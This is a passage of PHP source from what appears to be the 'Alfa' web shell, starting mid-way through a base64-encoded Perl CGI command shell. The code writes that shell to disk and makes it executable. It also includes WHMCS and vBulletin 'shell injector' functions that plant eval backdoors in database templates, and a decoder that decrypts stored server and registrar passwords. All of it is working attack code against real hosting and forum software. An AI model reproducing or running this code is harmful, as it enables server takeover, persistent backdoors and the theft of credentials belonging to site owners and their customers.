DQoJZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImYiKTsNCgkJcHJpbnQgIkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhIjsNCgkJJlByaW50RmlsZURvd25sb2FkRm9ybTsNCg0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCn0NCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmVnaW5Eb3dubG9hZA0Kew0KCSMgZ2V0IGZ1bGx5IHF1YWxpZmllZCBwYXRoIG9mIHRoZSBmaWxlIHRvIGJlIGRvd25sb2FkZWQNCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwNCgkJKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlDQoJew0KCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7DQoJfQ0KCWVsc2UgIyBwYXRoIGlzIHJlbGF0aXZlDQoJew0KCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOw0KCQkkVGFyZ2V0RmlsZSAuPSAkUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCX0NCg0KCWlmKCRPcHRpb25zIGVxICJnbyIpICMgd2UgaGF2ZSB0byBzZW5kIHRoZSBmaWxlDQoJew0KCQkmU2VuZEZpbGVUb0Jyb3dzZXIoJFRhcmdldEZpbGUpOw0KCX0NCgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQ0KCXsNCgkJJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXBsb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSB1cGxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCSZQcmludEZpbGVVcGxvYWRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCQlyZXR1cm47DQoJfQ0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCg0KCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzDQoJcHJpbnQgIlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkDQoJY2hvcCgkVGFyZ2V0TmFtZSkgaWYgKCRUYXJnZXROYW1lID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsNCg0KCSRUYXJnZXRGaWxlU2l6ZSA9IGxlbmd0aCgkaW57J2ZpbGVkYXRhJ30pOw0KCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KCWlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQ0KCXsNCgkJcHJpbnQgIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsNCgl9DQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCgl7DQoJCWlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0KCQl7DQoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsNCgkJCXByaW50IFVQTE9BREZJTEUgJGlueydmaWxlZGF0YSd9Ow0KCQkJY2xvc2UoVVBMT0FERklMRSk7DQoJCQlwcmludCAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7DQoJCQlwcmludCAiRmlsZSBQYXRoOiAkVGFyZ2V0TmFtZTxicj4iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJcHJpbnQgIkZhaWxlZDogJCE8YnI+IjsNCgkJfQ0KCX0NCglwcmludCAiIjsNCgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCg0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCXJldHVybjsNCgl9DQoJDQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiZSZWFkUGFyc2U7DQomR2V0Q29va2llczsNCg0KJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsNCiRTZXJ2ZXJOYW1lID0gJEVOVnsnU0VSVkVSX05BTUUnfTsNCiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCg0KJEFjdGlvbiA9ICRpbnsnYSd9Ow0KJEFjdGlvbiA9ICJsb2dpbiIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29tbWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAkaW57J2QnfTsNCmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCg0KJExvZ2dlZEluID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOw0KDQppZigkQWN0aW9uIGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgIyB1c2VyIG5lZWRzL2hhcyB0byBsb2dpbg0Kew0KCSZQZXJmb3JtTG9naW47DQoNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImNvbW1hbmQiKSAjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KCSZFeGVjdXRlQ29tbWFuZDsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlDQp7DQoJJlVwbG9hZEZpbGU7DQp9DQplbHNpZigkQWN0aW9uIGVxICJkb3dubG9hZCIpICMgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUNCnsNCgkmRG93bmxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgIyB1c2VyIHdhbnRzIHRvIGxvZ291dA0Kew0KCSZQZXJmb3JtTG9nb3V0Ow0KfQ==';
$solevisible1 = fopen('cgi.alfa','w+');
$solevisible2 = fwrite ($solevisible1 ,base64_decode($solevisible3));
fclose($solevisible1);
chmod('cgi.alfa',0755);
echo '<iframe src=cgialfa/cgi.alfa width=100% height=600px frameborder=0></iframe> ';
echo "</div>";
alfafooter();
}
function alfaWhmcs(){
alfahead();
echo '<div class=header><script>alfa1_=alfa2_="";</script><center><h3><span>| WHMCS TOOLS |</span></h3><center><h3><a href=# onclick="g(\'Whmcs\',null,\'shellinject\',null)">| Shell Injector | </a><a href=# onclick="g(\'Whmcs\',null,null,null,\'repair\')">| Repair DB | </a><a href=# onclick="g(\'Whmcs\',null,null,\'decoder\')">| Whmcs Decoder |</a></h3></center>';
if(isset($_POST['alfa3']) && ($_POST['alfa3'] == 'repair'))
{
echo "<script>alfa3_=alfa6_=alfa7_=alfa8_=alfa9_=alfa10_=\"\";</script><center><table border=0 width='100%'>
<tr><td>
<center><b><font color=\"#FFFF01\">==</font> <font color=\"#00A220\">WHMCS</font> <font color=\"#FFFFFF\">Repair</font> <font color=\"#FF0000\">Table</font><font color=\"#FFFF01\"> ==</font></b></font></center> <br>
<center><form onSubmit=\"g('Whmcs',null,null,null,'repair',null,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value); return false;\" method=POST>
<table border=1>
<tr><td><font face='Arial' color='#FFFFFF'><b>Mysql Host</b></font></td><td><input type=text name=dbh value=localhost size='50' ></td></tr>
<tr><td><font face='Arial' color='#FFFFFF'><b>Db User</b><br></font></td><td><input type=text name=dbu size='50' ></td></tr>
<tr><td><font face='Arial' color='#FFFFFF'><b>Db Name</b><br></font></td><td><input type=text name=dbn size='50' ></td></tr>
<tr><td><font face='Arial' color='#FFFFFF'><b>Db Pass</b><br></font></td><td><input type=text name=dbp size='50' ></td></tr>
</table>
<input type=submit value='>>'></form></center></td></tr></table></center>";
if(isset($_POST['alfa6'])) {
$dbu = $_POST['alfa6'];
$dbn = $_POST['alfa7'];
$dbp = $_POST['alfa8'];
$dbh = $_POST['alfa9'];
$newindex = "<p>Dear {\$client_name},</p><p>Recently a request was submitted to reset your password for our client area. If you did not request this, please ignore this email. It will expire and become useless in 2 hours time.</p><p>To reset your password, please visit the url below:<br /><a href=\"{\$pw_reset_url}\">{\$pw_reset_url}</a></p><p>When you visit the link above, your password will be reset, and the new password will be emailed to you.</p><p>{\$signature}</p>{php}if(\$_COOKIE[\"sec\"] == \"123\"){eval(base64_decode(\$_COOKIE[\"sec2\"])); die(\"!\");}{\/php}";
if (!empty($dbh) && !empty($dbu) && !empty($dbn))
{
mysql_connect($dbh,$dbu,$dbp) or die(mysql_error());
mysql_select_db($dbn) or die(mysql_error());
$inject = "UPDATE tblemailtemplates SET message='$newindex' WHERE id='37'";
$result = mysql_query($inject) or die (mysql_error());
echo "<script>alert('Table Repaired :D');</script>";
}
}
}
if(isset($_POST['alfa1']) && ($_POST['alfa1'] == 'shellinject'))
{
echo "<script>alfa2_=alfa3_=alfa6_=alfa7_=alfa8_=alfa9_=alfa10_=\"\";</script><center><table border=0 width='100%'>
<tr><td>
<center><b><font color=\"#FFFF01\">==</font> <font color=\"#00A220\">WHMCS</font> <font color=\"#FFFFFF\">Shell</font> <font color=\"#FF0000\">Injector</font><font color=\"#FFFF01\"> ==</font></b></center><br>
<center><form onSubmit=\"g('Whmcs',null,'shellinject',null,null,null,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,null); return false;\" method=POST>
<table border=1>
<tr><td><font face='Arial' color='#FFFFFF'><b>Mysql Host</b></font></td><td><input type=text name=dbh value=localhost size='50' ></td/></tr>
<tr><td><font face='Arial' color='#FFFFFF'><b>Db User</b><br></font></td><td><input type=text name=dbu size='50' ></td/></tr>
<tr><td><font face='Arial' color='#FFFFFF'><b>Db Name</b><br></font></td><td><input type=text name=dbn size='50' ></td/></tr>
<tr><td><font face='Arial' color='#FFFFFF'><b>Db Pass</b><br></font></td><td><input type=text name=dbp size='50' ></td/></tr>
</table>
<input type=submit value='>>'></form></center></td></tr></table></center>";
if(isset($_POST['alfa6'])) {
$dbu = $_POST['alfa6'];
$dbn = $_POST['alfa7'];
$dbp = $_POST['alfa8'];
$dbh = $_POST['alfa9'];
$index = "{php}eval(base64_decode('JHggPSBiYXNlNjRfZGVjb2RlKCJQRDl3YUhBTkNtVmphRzhnSWp4MGFYUnNaVDVUYjJ4bGRtbHphV0pzWlNCVmNHeHZZV1JsY2p3dmRHbDBiR1UrWEc0aU93MEtaV05vYnlBaVBDOW9aV0ZrUGx4dUlqc05DbVZqYUc4Z0lqeGliMlI1SUdKblkyOXNiM0k5SXpBd01EQXdNRDVjYmlJN0RRcGxZMmh2SUNJOFluSStYRzRpT3cwS1pXTm9ieUFpUEdObGJuUmxjajQ4Wm05dWRDQmpiMnh2Y2oxY0luZG9hWFJsWENJK1BHSStXVzkxY2lCSmNDQkJaR1J5WlhOeklHbHpQQzlpUGlBOFptOXVkQ0JqYjJ4dmNqMWNJbmRvYVhSbFhDSStQQzltYjI1MFBqd3ZZMlZ1ZEdWeVBpQmNiaUk3RFFwbFkyaHZJQ0k4WW1sblBqeGlhV2MrUEdadmJuUWdZMjlzYjNJOVhDSWpOME5HUXpBd1hDSStQR05sYm5SbGNqNWNiaUk3RFFwbFkyaHZJQ1JmVTBWU1ZrVlNXeWRTUlUxUFZFVmZRVVJFVWlkZE93MEtaV05vYnlBaVBDOWpaVzUwWlhJK1BDOW1iMjUwUGp3dllUNDhabTl1ZENCamIyeHZjajFjSWlNM1EwWkRNREJjSWo1Y2JpSTdEUXBsWTJodklDSThZbkkrWEc0aU93MEtaV05vYnlBaVBHSnlQbHh1SWpzTkNtVmphRzhnSWp4alpXNTBaWEkrUEdadmJuUWdZMjlzYjNJOVhDSWpOME5HUXpBd1hDSStQR0pwWno0OFltbG5QbE52YkdWMmFYTnBZbXhsSUZWd2JHOWhaQ0JCY21WaFBDOWlhV2MrUEM5bWIyNTBQand2WVQ0OFptOXVkQ0JqYjJ4dmNqMWNJaU0zUTBaRE1EQmNJajQ4TDJadmJuUStQQzlqWlc1MFpYSStQR0p5UGx4dUlqc05DbVZqYUc4Z0p6eGpaVzUwWlhJK1BHWnZjbTBnWVdOMGFXOXVQU0lpSUcxbGRHaHZaRDBpY0c5emRDSWdaVzVqZEhsd1pUMGliWFZzZEdsd1lYSjBMMlp2Y20wdFpHRjBZU0lnYm1GdFpUMGlkWEJzYjJGa1pYSWlJQTBLYVdROUluVndiRzloWkdWeUlqNG5PdzBLSUdWamFHOGdKenhwYm5CMWRDQjBlWEJsUFNKbWFXeGxJaUJ1WVcxbFBTSm1hV3hsSWlCemFYcGxQU0kwTlNJK1BHbHVjSFYwSUc1aGJXVTlJbDkxY0d3aUlIUjVjR1U5SW5OMVltMXBkQ0lnRFFwcFpEMGlYM1Z3YkNJZ2RtRnNkV1U5SWxWd2JHOWhaQ0krUEM5bWIzSnRQand2WTJWdWRHVnlQaWM3RFFvZ2FXWW9JQ1JmVUU5VFZGc25YM1Z3YkNkZElEMDlJQ0pWY0d4dllXUWlJQ2tnZXcwS0lHbG1LRUJqYjNCNUtDUmZSa2xNUlZOYkoyWnBiR1VuWFZzbmRHMXdYMjVoYldVblhTd2dKRjlHU1V4RlUxc25abWxzWlNkZFd5ZHVZVzFsSjEwcEtTQjdJR1ZqYUc4Z0RRb25QR0krUEdadmJuUWdZMjlzYjNJOVhDSWpOME5HUXpBd1hDSStQR05sYm5SbGNqNVZjR3h2WVdRZ1UzVmpZMlZ6YzJaMWJHeDVJRHNwUEM5bWIyNTBQand2WVQ0OFptOXVkQ0JqYjJ4dmNqMWNJaU0zUTBaRE1EQmNJajQ4TDJJK1BHSnlQanhpY2o0bk95QjlEUW9nSUNBZ0lHVnNjMlVnZXlCbFkyaHZJQ2M4WWo0OFptOXVkQ0JqYjJ4dmNqMWNJaU0zUTBaRE1EQmNJajQ4WTJWdWRHVnlQbFZ3Ykc5aFpDQm1ZV2xzWldRZ09pZzhMMlp2Ym5RK1BDOWhQanhtYjI1MElHTnZiRzl5UFZ3aUl6ZERSa013TUZ3aVBqd3ZZajROQ2p4aWNqNDhZbkkrSnpzZ2ZRMEtJSDBOQ2o4K0RRbzhZMlZ1ZEdWeVBqeHpjR0Z1SUhOMGVXeGxQU0ptYjI1MExYTnBlbVU2TXpCd2VEc2lQanh6Y0dGdUlITjBlV3hsUFNKaVlXTnJaM0p2ZFc1a09pQjFjbXdvSm5GMWIzUTdhSFIwY0RvdkwzVndMbWx5WVc0dGRHRnNheTVwY2k5MWNHeHZZV1J6THpFek16RTFOekV4TkRrekxtZHBaaVp4ZFc5ME95a2djbVZ3WldGMExYZ2djMk55YjJ4c0lEQWxJREFsSUhSeVlXNXpjR0Z5Wlc1ME95QmpiMnh2Y2pvZ2NtVmtPeUIwWlhoMExYTm9ZV1J2ZHpvZ09IQjRJRGh3ZUNBeE0zQjRPeUkrUEhOMGNtOXVaejQ4WWo0OFltbG5Qbk52YkdWMmFYTnBZbXhsUUdkdFlXbHNMbU52YlR3dllqNDhMMkpwWno0OEwzTjBjbTl1Wno0TkNnPT0iKTsNCiRzb2xldmlzaWJsZSA9IGZvcGVuKCJzb2xldmlzaWJsZS5waHAiLCJ3Iik7DQpmd3JpdGUoJHNvbGV2aXNpYmxlLCR4KTs='));{/php}";
$newin = str_replace("'","\'",$index);
$newindex = "<p>Dear $newin,</p><p>Recently a request was submitted to reset your password for our client area. If you did not request this, please ignore this email. It will expire and become useless in 2 hours time.</p><p>To reset your password, please visit the url below:<br /><a href=\"{\$pw_reset_url}\">{\$pw_reset_url}</a></p><p>When you visit the link above, your password will be reset, and the new password will be emailed to you.</p><p>{\$signature}</p>{php}if(\$_COOKIE[\"sec\"] == \"123\"){eval(base64_decode(\$_COOKIE[\"sec2\"])); die(\"!\");}{\/php}";
if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index))
{
mysql_connect($dbh,$dbu,$dbp) or die(mysql_error());
mysql_select_db($dbn) or die(mysql_error());
$inject = "UPDATE tblemailtemplates SET message='$newindex' WHERE id='37'";
$result = mysql_query($inject) or die (mysql_error());
$create = "insert into tblclients (email) values('solevisible@fbi.gov')";
$result2 = mysql_query($create) or die (mysql_error());
echo '<script>alert("shell injectet :\)")</script>';
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target </font><font color=red>\" http://target.com/whmcs/pwreset.php \"</font><br/><font color=\"#FFFFFF\"> and reset password with email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color=\"#FFFFFF\">and go to</font> <font color=red>\" http://target.com/whmcs/solevisible.php \"</font></b></center><br><br>";
}
}
}
if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'decoder'))
{
function decrypt ($string,$cc_encryption_hash)
{
$key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
$hash_key = _hash ($key);
$hash_length = strlen ($hash_key);
$string = base64_decode ($string);
$tmp_iv = substr ($string, 0, $hash_length);
$string = substr ($string, $hash_length, strlen ($string) - $hash_length);
$iv = $out = '';
$c = 0;
while ($c < $hash_length)
{
$iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
++$c;
}
$key = $iv;
$c = 0;
while ($c < strlen ($string))
{
if (($c != 0 AND $c % $hash_length == 0))
{
$key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
}
$out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
++$c;
}
return $out;
}
function _hash ($string)
{
if (function_exists ('sha1'))
{
$hash = sha1 ($string);
}
else
{
$hash = md5 ($string);
}
$out = '';
$c = 0;
while ($c < strlen ($hash))
{
$out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
$c += 2;
}
return $out;
}
echo "<script>alfa1_=alfa2_=alfa3_=alfa4_=alfa5_=alfa6_=alfa7_=\"\";</script>
<center>
<FORM action='' method='post' onsubmit=\"g('Whmcs',null,this.form_action.value,'decoder',this.db_username.value,this.db_password.value,this.db_name.value,this.cc_encryption_hash.value,this.db_host.value); return false;\">
<input type='hidden' name='form_action' value='2'>
<table border=1>
<center><b><font color=\"#FFFF01\">==</font> <font color=\"#00A220\">WHMCS</font> <font color=\"#FFFFFF\">De</font><font color=\"#FF0000\">Coder</font><font color=\"#FFFF01\"> ==</font></b></center><br>
<tr><td><font color=\"#FFFFFF\"><b>db_host : </b></font></td><td><input type='text' size='50' name='db_host' value='localhost'></td></tr>
<tr><td><font color=\"#FFFFFF\"><b>db_username : </b></font></td><td><input type='text' size='50' name='db_username' value=''></td></tr>
<tr><td><font color=\"#FFFFFF\"><b>db_password : </b></font></td><td><input type='text' size='50' name='db_password' value=''></td></tr>
<tr><td><font color=\"#FFFFFF\"><b>db_name : </b></font></td><td><input type='text' size='50' name='db_name' value=''></td></tr>
<tr><td><font color=\"#FFFFFF\"><b>cc_encryption_hash : </b></font></td><td><input type='text' size='50' name='cc_encryption_hash' value=''></td></tr>
</table>
<INPUT class=submit type='submit' value='>>' name='Submit'>
</FORM>
</center>";
if($_POST['alfa1'] == 2 && $_POST['alfa3'])
{
$db_host=($_POST['alfa7']);
$db_username=($_POST['alfa3']);
$db_password=($_POST['alfa4']);
$db_name=($_POST['alfa5']);
$cc_encryption_hash=($_POST['alfa6']);
echo '<br><pre id="strOutput" style="margin-top:5px" class="ml1"><br>';
$link=mysql_connect($db_host,$db_username,$db_password) or die(mysql_error());
mysql_select_db($db_name,$link) ;
$query = mysql_query("SELECT * FROM tblservers");
$num = mysql_num_rows($query);
if ($num > 0){
for($i=0; $i <=$num -1; $i++){
$v = mysql_fetch_array($query);
$ipaddress = $v['ipaddress'];
$username = $v['username'];
$type = $v['type'];
$active = $v['active'];
$hostname = $v['hostname'];
echo("<center><table border='1'>");
$password = decrypt ($v['password'], $cc_encryption_hash);
echo("<tr><td><b><font color=\"#FFFFFF\">Type</font></td><td>$type</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Active</font></td><td>$active</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Hostname</font></td><td>$hostname</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Ip</font></td><td>$ipaddress</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Username</font></td><td>$username</td></tr></b>");
echo("<tr><td><b><font color=\"#FFFFFF\">Password</font></td><td>$password</td></tr></b>");
echo "</table><br><br></center>";
}
$query1 = mysql_query("SELECT * FROM tblregistrars");
$num1 = mysql_num_rows($query1);
if ($num1 > 0){
for($i=0; $i <=$num1 -1; $i++){
$v = mysql_fetch_array($query1);
$registrar = $v['registrar'];
$setting = $v['setting'];
$value = decrypt ($v['value'], $cc_encryption_hash);
if ($value=="") {
$value=0;
}
echo("<center>Domain Reseller <br><center>");
echo("<center><table border='1'>");
echo("<tr><td><b><font color=\"#67ABDF\">Register</font></td><td>$registrar</td></tr></b>");
echo("<tr><td><b><font color=\"#67ABDF\">Setting</font></td><td>$setting</td></tr></b>");
echo("<tr><td><b><font color=\"#67ABDF\">Value</font></td><td>$value</td></tr></b>");
echo "</table><br><br></center>";
}
}
}
}
}
echo "</div>";
alfafooter();
}
function alfaVbinject(){
alfahead();
echo '<div class=header>';
echo '<script>alfa1_=alfa2_=alfa3_=alfa4_=alfa5_=alfa6_=\"\";</script>
<center><br><br><b><font color="#FFFF01">==</font> <font color="#00A220">vBulletin</font> <font color="#FFFFFF">Shell</font> <font color="#FF0000">Injector</font><font color="#FFFF01"> ==</font></b></font>
<form name="frm" action="" method="POST" onsubmit="g(null,null,this.template.value,this.lo.value,this.db.value,this.user.value,this.pass.value,this.tab.value); return false;">
<br>
<font color="#FFFFFF"><b>Inject To : </b></font><br><select size="1" name="template">
<option value="FAQ">faq.php</option>
<option value="FORUMHOME">FORUMHOME</option>
<option value="search_forums">search forums</option>
<option value="SHOWGROUPS">SHOWGROUPS</option>
<option value="SHOWTHREAD">showthread.php</option>
<option value="CALENDAR">calendar.php</option>
<option value="MEMBERINFO">MEMBERINFO</option>
<option value="footer">footer</option>
<option value="header">header</option>
<option value="headinclude">headinclude</option>
<option value="lostpw">lostpw</option>
<option value="memberlist">memberlist</option></select></p>
<table border=1>
<tr><td><font color="#FFFFFF"><b>Host : </b></font></td><td><input name=\'lo\' type=\'text\' value=\'localhost\' size=\'30\'></td></tr>
<tr><td><font color="#FFFFFF"><b>DataBase Name : </b></font></td><td><input type=\'text\' size=\'30\' name=\'db\' value=\'\'></td></tr>
<tr><td><font color="#FFFFFF"><b>User Name : </b></font></td><td><input type=\'text\' size=\'30\' name=\'user\' value=\'\'></td></tr>
<tr><td><font color="#FFFFFF"><b>Password : </b></font></td><td><input type=\'text\' size=\'30\' name=\'pass\' value=\'\'></td></tr>
<tr><td><font color="#FFFFFF"><b>Table Prefix : </b></font></td><td><input type=\'text\' size=\'30\' name=\'tab\' value=\'\'></td></tr>
</table>
<br><input type="submit" value=">>"/>
</form></center>';
if($_POST['alfa5']){
$code = "{\${eval(base64_decode(\'JGNvZGUgPSAnUEQ5d2FIQU5DbVZqYUc4Z0lqeDBhWFJzWlQ1VGIyeGxkbWx6YVdKc1pTQlZjR3h2WVdSbGNqd3ZkR2wwYkdVK1hHNGlPdzBLWldOb2J5QWlQQzlvWldGa1BseHVJanNOQ21WamFHOGdJanhpYjJSNUlHSm5ZMjlzYjNJOUl6QXdNREF3TUQ1Y2JpSTdEUXBsWTJodklDSThZbkkrWEc0aU93MEtaV05vYnlBaVBHTmxiblJsY2o0OFptOXVkQ0JqYjJ4dmNqMWNJbmRvYVhSbFhDSStQR0krV1c5MWNpQkpjQ0JCWkdSeVpYTnpJR2x6UEM5aVBpQThabTl1ZENCamIyeHZjajFjSW5kb2FYUmxYQ0krUEM5bWIyNTBQand2WTJWdWRHVnlQaUJjYmlJN0RRcGxZMmh2SUNJOFltbG5QanhpYVdjK1BHWnZiblFnWTI5c2IzSTlYQ0lqTjBOR1F6QXdYQ0krUEdObGJuUmxjajVjYmlJN0RRcGxZMmh2SUNSZlUwVlNWa1ZTV3lkU1JVMVBWRVZmUVVSRVVpZGRPdzBLWldOb2J5QWlQQzlqWlc1MFpYSStQQzltYjI1MFBqd3ZZVDQ4Wm05dWRDQmpiMnh2Y2oxY0lpTTNRMFpETURCY0lqNWNiaUk3RFFwbFkyaHZJQ0k4WW5JK1hHNGlPdzBLWldOb2J5QWlQR0p5UGx4dUlqc05DbVZqYUc4Z0lqeGpaVzUwWlhJK1BHWnZiblFnWTI5c2IzSTlYQ0lqTjBOR1F6QXdYQ0krUEdKcFp6NDhZbWxuUGxOdmJHVjJhWE5wWW14bElGVndiRzloWkNCQmNtVmhQQzlpYVdjK1BDOW1iMjUwUGp3dllUNDhabTl1ZENCamIyeHZjajFjSWlNM1EwWkRNREJjSWo0OEwyWnZiblErUEM5alpXNTBaWEkrUEdKeVBseHVJanNOQ21WamFHOGdKenhqWlc1MFpYSStQR1p2Y20wZ1lXTjBhVzl1UFNJaUlHMWxkR2h2WkQwaWNHOXp